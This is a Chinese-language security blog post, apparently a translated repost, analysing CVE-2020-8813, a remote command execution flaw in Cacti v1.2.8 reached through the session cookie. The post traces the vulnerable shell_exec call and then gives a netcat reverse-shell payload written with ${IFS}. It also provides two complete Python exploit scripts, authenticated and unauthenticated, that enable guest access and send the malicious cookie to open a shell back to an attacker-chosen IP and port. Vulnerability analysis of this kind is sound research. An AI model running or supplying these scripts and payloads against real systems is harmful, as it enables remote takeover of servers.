<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>She11c0de&#39;s blogs</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="（CVE-2020-8813）Cacti v1.2.8 远程命令执行漏洞一、漏洞简介需要拥有登录账号密码；或者网站启用了” Gest Realtime Graphs”特权功能。    1、判断是否存在”&#x2F;graph_realtime.php?action&#x3D;init”链接    2、判断1、存在”poller_realtime.php”字样，则存在漏洞。   二、漏洞影响Cacti v1.2.8 三">
<meta property="og:type" content="article">
<meta property="og:title" content="She11c0de&#39;s blogs">
<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Cacti/%EF%BC%88CVE-2020-8813%EF%BC%89Cacti%20v1.2.8%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/index.html">
<meta property="og:site_name" content="She11c0de&#39;s blogs">
<meta property="og:description" content="（CVE-2020-8813）Cacti v1.2.8 远程命令执行漏洞一、漏洞简介需要拥有登录账号密码；或者网站启用了” Gest Realtime Graphs”特权功能。    1、判断是否存在”&#x2F;graph_realtime.php?action&#x3D;init”链接    2、判断1、存在”poller_realtime.php”字样，则存在漏洞。   二、漏洞影响Cacti v1.2.8 三">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2020-8813)Cactiv1.2.8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId26.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2020-8813)Cactiv1.2.8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId27.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2020-8813)Cactiv1.2.8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId28.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2020-8813)Cactiv1.2.8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId29.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2020-8813)Cactiv1.2.8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId30.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2020-8813)Cactiv1.2.8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId31.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2020-8813)Cactiv1.2.8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId33.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2020-8813)Cactiv1.2.8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId34.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2020-8813)Cactiv1.2.8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId35.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2020-8813)Cactiv1.2.8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId36.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2020-8813)Cactiv1.2.8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId38.png">
<meta property="article:published_time" content="2022-07-08T06:25:53.534Z">
<meta property="article:modified_time" content="2022-07-08T07:24:51.675Z">
<meta property="article:author" content="She11c0de">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://she11c0de.github.io/resource/(CVE-2020-8813)Cactiv1.2.8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId26.png">
  
  
    <link rel="icon" href="/favicon.png">
  
  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
  
<link rel="stylesheet" href="/css/style.css">

  
<link rel="stylesheet" href="/css/scrollUp/image.css">

  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
  
<meta name="generator" content="Hexo 5.4.2"></head>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <div class="logo">
        <img src="/logo.png" alt="Profile Picture">
      </div>
      <div id="title">She11c0de's blogs</div>
      
       <ul class="my-socials">
  
 
</ul>
    </div>
  </div>
  <div id="header-inner" class="">
    <nav id="main-nav">
      <a id="main-nav-toggle" class="nav-icon"></a>
      <!--
        
          
            <a class="main-nav-link" href="/">首页</a>
          
            <a class="main-nav-link" href="/categories/life">生活</a>
          
            <a class="main-nav-link" href="/archives">归档</a>
          
        
      -->
    </nav>
    <nav id="title-nav" style="display:none">
      <a href="/">She11c0de&#39;s blogs</a>
      <img src="/logo.png" alt="Profile Picture">
      <!--
      <span id="title-nav-socials">
        
       
     </span>
      -->
    </nav>
    <nav id="sub-nav">
      
      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
    </nav>
    <div id="search-form-wrap">
      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
        <input type="submit" value="" class="search-form-submit">
        <input name=tn type=hidden value="bds">
        <input name=cl type=hidden value="3">
        <input name=ct type=hidden value="2097152">
        <input type="hidden" name="si" value="she11c0de.github.io">
      </form>
    </div>
  </div>
  <div class="site-nav" style="display: none;">
    <ul>
      
      
        <li><a href="/">首页</a></li>
      
        <li><a href="/categories/life">生活</a></li>
      
        <li><a href="/archives">归档</a></li>
      
      
    </ul>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-Cacti/（CVE-2020-8813）Cacti v1.2.8 远程命令执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Cacti/%EF%BC%88CVE-2020-8813%EF%BC%89Cacti%20v1.2.8%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
  <time datetime="2022-07-08T06:25:53.534Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="（CVE-2020-8813）Cacti-v1-2-8-远程命令执行漏洞"><a href="#（CVE-2020-8813）Cacti-v1-2-8-远程命令执行漏洞" class="headerlink" title="（CVE-2020-8813）Cacti v1.2.8 远程命令执行漏洞"></a>（CVE-2020-8813）Cacti v1.2.8 远程命令执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>需要拥有登录账号密码；或者网站启用了” Gest Realtime Graphs”特权功能。</p>
<ul>
<li><p>  1、判断是否存在”/graph_realtime.php?action=init”链接</p>
</li>
<li><p>  2、判断1、存在”poller_realtime.php”字样，则存在漏洞。</p>
</li>
</ul>
<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Cacti v1.2.8</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>我通过分析Cacti主要代码中的多个功能的代码发现了此漏洞，我必须将多个因素联系在一起才能执行代码，该漏洞主要发生在攻击者尝试将恶意代码注入”<br>Cacti”<br>cookie变量时，在与一些字符串连接后被传递给shell_exec函数，但是当我尝试操作cookie值时会遇到身份验证问题，这将使我无法访问该页面，因此解决了我注意到可以按以下方式访问易受攻击的页面：一个不需要进行身份验证即可访问的”来宾”，因此我链接了我的漏洞利用程序，以启用”<br>graph_realtime.php”页面的”来宾”视图，然后发出恶意请求，以便在主机上执行代码。</p>
<p>为了完成这项工作，首先，我需要向”<br>user_admin.php”页面发送请求以启用realtime_graph的”来宾”特权，然后再次将恶意请求发送至”<br>graph_realtime.php”页面。</p>
<p>因此，我像往常一样从<a target="_blank" rel="noopener" href="https://github.com/mhaskar/RCEScanner">超级简单的RCE扫描器</a>脚本开始，以在Cacti中寻找RCE。</p>
<p>运行脚本后，在” graph_realtime.php”文件中得到了一个有趣的结果：</p>
<blockquote>
<p>graph_realtime.php</p>
</blockquote>
<pre><code>/* call poller */
$graph_rrd = read_config_option(&#39;realtime_cache_path&#39;) . &#39;/user_&#39; . session_id() . &#39;_lgi_&#39; . get_request_var(&#39;local_graph_id&#39;) . &#39;.png&#39;;
$command   = read_config_option(&#39;path_php_binary&#39;);
$args      = sprintf(&#39;poller_realtime.php --graph=%s --interval=%d --poller_id=&#39; . session_id(), get_request_var(&#39;local_graph_id&#39;), $graph_data_array[&#39;ds_step&#39;]);
shell_exec(&quot;$command $args&quot;);
 
/* construct the image name  */
$graph_data_array[&#39;export_realtime&#39;] = $graph_rrd;
$graph_data_array[&#39;output_flag&#39;]     = RRDTOOL_OUTPUT_GRAPH_DATA;
$null_param = array();
</code></pre>
<p>从行号170和171中可以看到，我们正在接收几个参数并将它们连接在一起，我们还可以看到有一个名为”<br>get_request_var”的函数，该函数执行以下操作：</p>
<blockquote>
<p>html_utility.php</p>
</blockquote>
<pre><code>function get_request_var($name, $default = &#39;&#39;) &#123;
    global $_CACTI_REQUEST;
 
    $log_validation = read_config_option(&#39;log_validation&#39;);
 
    if (isset($_CACTI_REQUEST[$name])) &#123;
        return $_CACTI_REQUEST[$name];
    &#125; elseif (isset_request_var($name)) &#123;
        if ($log_validation == &#39;on&#39;) &#123;
            html_log_input_error($name);
        &#125;
 
        set_request_var($name, $_REQUEST[$name]);
 
        return $_REQUEST[$name];
    &#125; else &#123;
        return $default;
    &#125;
&#125;
</code></pre>
<p>正如我们所看到的，该函数将通过”<br>set_request_var”函数处理输入并设置参数值，该函数将执行以下操作：</p>
<blockquote>
<p>html_utility.php</p>
</blockquote>
<pre><code>function set_request_var($variable, $value) &#123;
    global $_CACTI_REQUEST;
 
    $_CACTI_REQUEST[$variable] = $value;
    $_REQUEST[$variable]       = $value;
    $_POST[$variable]          = $value;
    $_GET[$variable]           = $value;
&#125;
</code></pre>
<p>因此，回到我们的”<br>graph_realtime.php”，我们可以看到我们可以控制以下几个输入：</p>
<ul>
<li><p>  local_graph_id</p>
</li>
<li><p>  $ graph_data_array [&#39;ds_step&#39;]的值</p>
</li>
</ul>
<p>但不幸的是，由于以下几个原因，我们不能这样做：首先，我们注意到graph_realtime.php文件中的第171行使用sprintf来处理输入，并且我们可以看到第一个值”<br>graph”充满了我们可以控制的值”<br>local_graph_id”！但是再次不幸的是，该值将被名为”<br>get_filter_request_var”的函数过滤，我们可以看到它的值已在graph_realtime.php第38行中过滤，如下所示：</p>
<blockquote>
<p>html_utility.php</p>
</blockquote>
<pre><code>function get_filter_request_var($name, $filter = FILTER_VALIDATE_INT, $options = array()) &#123;
    if (isset_request_var($name)) &#123;
        if (isempty_request_var($name)) &#123;
            set_request_var($name, get_nfilter_request_var($name));
 
            return get_request_var($name);
        &#125; elseif (get_nfilter_request_var($name) == &#39;undefined&#39;) &#123;
            if (isset($options[&#39;default&#39;])) &#123;
                set_request_var($name, $options[&#39;default&#39;]);
 
                return $options[&#39;default&#39;];
            &#125; else &#123;
                set_request_var($name, &#39;&#39;);
 
                return &#39;&#39;;
            &#125;
        &#125; else &#123;
            if (get_nfilter_request_var($name) == &#39;0&#39;) &#123;
                $value = &#39;0&#39;;
            &#125; elseif (get_nfilter_request_var($name) == &#39;undefined&#39;) &#123;
                if (isset($options[&#39;default&#39;])) &#123;
                    $value = $options[&#39;default&#39;];
                &#125; else &#123;
                    $value = &#39;&#39;;
                &#125;
            &#125; elseif (isempty_request_var($name)) &#123;
                $value = &#39;&#39;;
            &#125; elseif ($filter == FILTER_VALIDATE_IS_REGEX) &#123;
                if (is_base64_encoded($_REQUEST[$name])) &#123;
                    $_REQUEST[$name] = utf8_decode(base64_decode($_REQUEST[$name]));
                &#125;
 
                $valid = validate_is_regex($_REQUEST[$name]);
                if ($valid === true) &#123;
                    $value = $_REQUEST[$name];
                &#125; else &#123;
                    $value = false;
                    $custom_error = $valid;
                &#125;
            &#125; elseif ($filter == FILTER_VALIDATE_IS_NUMERIC_ARRAY) &#123;
                $valid = true;
                if (is_array($_REQUEST[$name])) &#123;
                    foreach($_REQUEST[$name] AS $number) &#123;
                        if (!is_numeric($number)) &#123;
                            $valid = false;
                            break;
                        &#125;
                    &#125;
                &#125; else &#123;
                    $valid = false;
                &#125;
 
                if ($valid == true) &#123;
                    $value = $_REQUEST[$name];
                &#125; else &#123;
                    $value = false;
                &#125;
            &#125; elseif ($filter == FILTER_VALIDATE_IS_NUMERIC_LIST) &#123;
                $valid = true;
                $values = preg_split(&#39;/,/&#39;, $_REQUEST[$name], NULL, PREG_SPLIT_NO_EMPTY);
                foreach($values AS $number) &#123;
                    if (!is_numeric($number)) &#123;
                        $valid = false;
                        break;
                    &#125;
                &#125;
 
                if ($valid == true) &#123;
                    $value = $_REQUEST[$name];
                &#125; else &#123;
                    $value = false;
                &#125;
            &#125; elseif (!cacti_sizeof($options)) &#123;
                $value = filter_var($_REQUEST[$name], $filter);
            &#125; else &#123;
                $value = filter_var($_REQUEST[$name], $filter, $options);
            &#125;
        &#125;
 
        if ($value === false) &#123;
            if ($filter == FILTER_VALIDATE_IS_REGEX) &#123;
                $_SESSION[&#39;custom_error&#39;] = __(&#39;The search term &quot;%s&quot; is not valid. Error is %s&#39;, html_escape(get_nfilter_request_var($name)), html_escape($custom_error));
                set_request_var($name, &#39;&#39;);
                raise_message(&#39;custom_error&#39;);
            &#125; else &#123;
                die_html_input_error($name, get_nfilter_request_var($name));
            &#125;
        &#125; else &#123;
            set_request_var($name, $value);
 
            return $value;
        &#125;
    &#125; else &#123;
        if (isset($options[&#39;default&#39;])) &#123;
            set_request_var($name, $options[&#39;default&#39;]);
 
            return $options[&#39;default&#39;];
        &#125; else &#123;
            return;
        &#125;
    &#125;
&#125;
</code></pre>
<p>该函数将过滤输入并返回一个干净的变量以传递给该函数。</p>
<p>另外，对于第二个变量” $ graph_data_array<br>[&#39;ds_step&#39;]“，它已经通过sprintf处理为％d，表示”十进制值”，因此我们不能使用它来注入恶意命令。</p>
<p>那么我们怎样才能使这件事起作用呢？让我们再次看一下代码：</p>
<blockquote>
<p>graph_realtime.php</p>
</blockquote>
<pre><code>/* call poller */
$graph_rrd = read_config_option(&#39;realtime_cache_path&#39;) . &#39;/user_&#39; . session_id() . &#39;_lgi_&#39; . get_request_var(&#39;local_graph_id&#39;) . &#39;.png&#39;;
$command   = read_config_option(&#39;path_php_binary&#39;);
$args      = sprintf(&#39;poller_realtime.php --graph=%s --interval=%d --poller_id=&#39; . session_id(), get_request_var(&#39;local_graph_id&#39;), $graph_data_array[&#39;ds_step&#39;]);
shell_exec(&quot;$command $args&quot;);
 
/* construct the image name  */
$graph_data_array[&#39;export_realtime&#39;] = $graph_rrd;
$graph_data_array[&#39;output_flag&#39;]     = RRDTOOL_OUTPUT_GRAPH_DATA;
$null_param = array();
</code></pre>
<p>我们得到另一个传递给shell_exec的变量，它是”<br>session_id（）”函数的值，该函数将返回用户当前会话的值，这意味着我们可以使用它来注入命令！</p>
<p>可是等等！如果我们操纵了会话，则将无法访问该页面，因为该页面要求对用户进行身份验证才能访问该页面。因此，在软件中进行了一些额外的挖掘之后，我发现如果我们能够以访客身份访问该页面启用了一种称为”实时图”的特殊特权，我们可以从此页面看到：</p>
<p><img src="/resource/(CVE-2020-8813)Cactiv1.2.8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId26.png"></p>
<p>让我们尝试在没有启用”访客实时图”特权的情况下访问此页面：</p>
<p><img src="/resource/(CVE-2020-8813)Cactiv1.2.8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId27.png"></p>
<p>如我们所见，由于权限问题，我们无法访问该页面，不允许尝试启用它并访问该页面以获取以下内容：</p>
<p><img src="/resource/(CVE-2020-8813)Cactiv1.2.8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId28.png"></p>
<p>完美的是，我们访问了页面，现在我将向”<br>graph_realtime.php”发送请求，并添加一条调试语句，该语句将回显将传递给shell_exec的参数：</p>
<p><img src="/resource/(CVE-2020-8813)Cactiv1.2.8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId29.png"></p>
<p><img src="/resource/(CVE-2020-8813)Cactiv1.2.8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId30.png"></p>
<p>如我们所见，我们将会话打印输出给我们，因此让我们尝试将自定义字符串注入会话中，看看会发生什么：</p>
<p><img src="/resource/(CVE-2020-8813)Cactiv1.2.8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId31.png"></p>
<h3 id="payload编写"><a href="#payload编写" class="headerlink" title="payload编写"></a>payload编写</h3><p>在控制了会话值之后，我们需要使用它来在系统上执行代码，但这仍然是一个会话值，这意味着即使对它进行编码也不能在其中使用某些字符，因此我们需要编写”会话友好”<br>“，我们可以注入这些有效负载而无需强制应用程序为我们生成另一个Cookie值。</p>
<p>例如，如果我对字符串” Hi<br>Payload”进行编码并将其传递给应用程序，我将得到以下信息：</p>
<p><img src="/resource/(CVE-2020-8813)Cactiv1.2.8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId33.png"></p>
<p><img src="/resource/(CVE-2020-8813)Cactiv1.2.8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId34.png"></p>
<p>如我们所见，该应用程序为我们设置了一个cookie而不是我们注入的cookie，因此要解决此问题，我们需要使用自定义有效负载。</p>
<p>因此，为了避免使用空格，我想到了使用” $ {IFS}”<br>bash变量来表示空格的想法。</p>
<p>当然，我们需要使用”;”转义命令 如下所示：</p>
<pre><code>;payload
</code></pre>
<p>如果要使用netcat获得外壳，则需要创建以下有效负载：</p>
<pre><code>;``nc``$&#123;IFS&#125;-e$&#123;IFS&#125;``/bin/bash``$&#123;IFS&#125;ip$&#123;IFS&#125;port
</code></pre>
<p>让我们尝试一下，首先对有效负载进行编码，以查看结果：</p>
<p><img src="/resource/(CVE-2020-8813)Cactiv1.2.8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId35.png"></p>
<p>然后将其发送到应用程序以获取以下信息：</p>
<p><img src="/resource/(CVE-2020-8813)Cactiv1.2.8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId36.png"></p>
<h3 id="完整版的poc"><a href="#完整版的poc" class="headerlink" title="完整版的poc"></a>完整版的poc</h3><p>为了自动化利用过程，我编写了一个python代码来利用此漏洞，利用此漏洞将处理登录过程以启用”来宾实时图”特权，然后将生成有效负载并将精心制作的请求发送到”<br>graph_realtime.php”页面为了获得反向壳。</p>
<p>这是完整的利用代码：</p>
<pre><code>#!/usr/bin/python3
 
# Exploit Title: Cacti v1.2.8 Remote Code Execution
# Date: 03/02/2020
# Exploit Author: Askar (@mohammadaskar2)
# CVE: CVE-2020-8813
# Vendor Homepage: https://cacti.net/
# Version: v1.2.8
# Tested on: CentOS 7.3 / PHP 7.1.33
 
import requests
import sys
import warnings
from bs4 import BeautifulSoup
from urllib.parse import quote
 
warnings.filterwarnings(&quot;ignore&quot;, category=UserWarning, module=&#39;bs4&#39;)
 
 
if len(sys.argv) != 6:
    print(&quot;[~] Usage : ./Cacti-exploit.py url username password ip port&quot;)
    exit()
 
url = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]
ip = sys.argv[4]
port = sys.argv[5]
 
def login(token):
    login_info = &#123;
    &quot;login_username&quot;: username,
    &quot;login_password&quot;: password,
    &quot;action&quot;: &quot;login&quot;,
    &quot;__csrf_magic&quot;: token
    &#125;
    login_request = request.post(url+&quot;/index.php&quot;, login_info)
    login_text = login_request.text
    if &quot;Invalid User Name/Password Please Retype&quot; in login_text:
        return False
    else:
        return True
 
def enable_guest(token):
    request_info = &#123;
    &quot;id&quot;: &quot;3&quot;,
    &quot;section25&quot;: &quot;on&quot;,
    &quot;section7&quot;: &quot;on&quot;,
    &quot;tab&quot;: &quot;realms&quot;,
    &quot;save_component_realm_perms&quot;: 1,
    &quot;action&quot;: &quot;save&quot;,
    &quot;__csrf_magic&quot;: token
    &#125;
    enable_request = request.post(url+&quot;/user_admin.php?header=false&quot;, request_info)
    if enable_request:
        return True
    else:
        return False
 
def send_exploit():
    payload = &quot;;nc$&#123;IFS&#125;-e$&#123;IFS&#125;/bin/bash$&#123;IFS&#125;%s$&#123;IFS&#125;%s&quot; % (ip, port)
    cookies = &#123;&#39;Cacti&#39;: quote(payload)&#125;
    requests.get(url+&quot;/graph_realtime.php?action=init&quot;, cookies=cookies)
 
request = requests.session()
print(&quot;[+]Retrieving login CSRF token&quot;)
page = request.get(url+&quot;/index.php&quot;)
html_content = page.text
soup = BeautifulSoup(html_content, &quot;html5lib&quot;)
token = soup.findAll(&#39;input&#39;)[0].get(&quot;value&quot;)
if token:
    print(&quot;[+]Token Found : %s&quot; % token)
    print(&quot;[+]Sending creds ..&quot;)
    login_status = login(token)
    if login_status:
        print(&quot;[+]Successfully LoggedIn&quot;)
        print(&quot;[+]Retrieving CSRF token ..&quot;)
        page = request.get(url+&quot;/user_admin.php?action=user_edit&amp;id=3&amp;tab=realms&quot;)
        html_content = page.text
        soup = BeautifulSoup(html_content, &quot;html5lib&quot;)
        token = soup.findAll(&#39;input&#39;)[1].get(&quot;value&quot;)
        if token:
            print(&quot;[+]Making some noise ..&quot;)
            guest_realtime = enable_guest(token)
            if guest_realtime:
                print(&quot;[+]Sending malicous request, check your nc ;)&quot;)
                send_exploit()
            else:
                print(&quot;[-]Error while activating the malicous account&quot;)
 
        else:
            print(&quot;[-] Unable to retrieve CSRF token from admin page!&quot;)
            exit()
 
    else:
        print(&quot;[-]Cannot Login!&quot;)
else:
    print(&quot;[-] Unable to retrieve CSRF token!&quot;)
    exit()
</code></pre>
<p>运行漏洞利用代码后，我们将获得以下内容：</p>
<p><img src="/resource/(CVE-2020-8813)Cactiv1.2.8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId38.png"></p>
<h3 id="未经身份验证的利用"><a href="#未经身份验证的利用" class="headerlink" title="未经身份验证的利用"></a>未经身份验证的利用</h3><p>如果Cacti启用了”来宾实时图”特权，则无需身份验证即可利用此漏洞，因此在这种情况下，不需要身份验证部分，您可以使用以下代码来利用此漏洞：</p>
<pre><code>#!/usr/bin/python3
 
# Exploit Title: Cacti v1.2.8 Unauthenticated Remote Code Execution
# Date: 03/02/2020
# Exploit Author: Askar (@mohammadaskar2)
# CVE: CVE-2020-8813
# Vendor Homepage: https://cacti.net/
# Version: v1.2.8
# Tested on: CentOS 7.3 / PHP 7.1.33
 
import requests
import sys
import warnings
from bs4 import BeautifulSoup
from urllib.parse import quote
 
warnings.filterwarnings(&quot;ignore&quot;, category=UserWarning, module=&#39;bs4&#39;)
 
 
if len(sys.argv) != 4:
    print(&quot;[~] Usage : ./Cacti-exploit.py url ip port&quot;)
    exit()
 
url = sys.argv[1]
ip = sys.argv[2]
port = sys.argv[3]
 
def send_exploit(url):
    payload = &quot;;nc$&#123;IFS&#125;-e$&#123;IFS&#125;/bin/bash$&#123;IFS&#125;%s$&#123;IFS&#125;%s&quot; % (ip, port)
    cookies = &#123;&#39;Cacti&#39;: quote(payload)&#125;
    path = url+&quot;/graph_realtime.php?action=init&quot;
    req = requests.get(path)
    if req.status_code == 200 and &quot;poller_realtime.php&quot; in req.text:
        print(&quot;[+] File Found and Guest is enabled!&quot;)
        print(&quot;[+] Sending malicous request, check your nc ;)&quot;)
        requests.get(path, cookies=cookies)
    else:
        print(&quot;[+] Error while requesting the file!&quot;)
 
send_exploit(url)
</code></pre>
<p>image</p>
<p>如我们所见，如果启用了” Gest Realtime<br>Graphs”特权，我们也可以毫无问题地利用它，因此最好检查”<br>graph_realtime.php”文件是否具有此访问特权。</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://shells.systems/cacti-v1-2-8-authenticated-remote-code-execution-cve-2020-8813/">https://shells.systems/cacti-v1-2-8-authenticated-remote-code-execution-cve-2020-8813/</a></p>
</blockquote>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Cacti/%EF%BC%88CVE-2020-8813%EF%BC%89Cacti%20v1.2.8%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-id="cl5c2qn2g0039y8v15qh91eqw" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2022/07/07/CatfishCMS/CatfishCMS%204.5.7%20csrf%20getshell/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          (no title)
        
      </div>
    </a>
  
  
    <a href="/2022/07/07/BSPHP/BSPHP%20%E5%AD%98%E5%9C%A8%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title"></div>
    </a>
  
</nav>

  
</article>

</section>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2022 She11c0de<br>
      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <!--
      <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">首页</a>
  
    <a href="/categories/life" class="mobile-nav-link">生活</a>
  
    <a href="/archives" class="mobile-nav-link">归档</a>
  
</nav>
    -->
    

<!-- 百度分享 start -->

<!-- 百度分享 end -->

<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>




<script src="/js/jquery.scrollUp.min.js"></script>


<script src="/js/jquery.transform.js"></script>


<script src="/js/menu.js"></script>



<script src="/js/script.js"></script>


<script src="/js/scrollUp.js"></script>


  </div>
</body>
</html>